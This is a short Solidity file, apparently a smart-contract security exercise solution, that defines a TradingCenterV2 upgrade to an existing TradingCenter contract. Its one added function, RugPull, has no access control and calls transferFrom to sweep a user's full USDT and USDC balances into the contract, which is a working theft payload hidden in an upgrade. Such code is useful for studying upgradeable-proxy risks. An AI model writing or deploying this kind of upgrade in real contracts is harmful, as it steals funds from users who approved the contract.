// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;
import {TradingCenter} from "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract TradingCenterV2 is TradingCenter {
    function VERSION() public pure returns (string memory) {
        return "v2";
    }

    function RugPull(address user) public {
        usdt.transferFrom(user, address(this), usdt.balanceOf(user));
        usdc.transferFrom(user, address(this), usdc.balanceOf(user));
    }
}
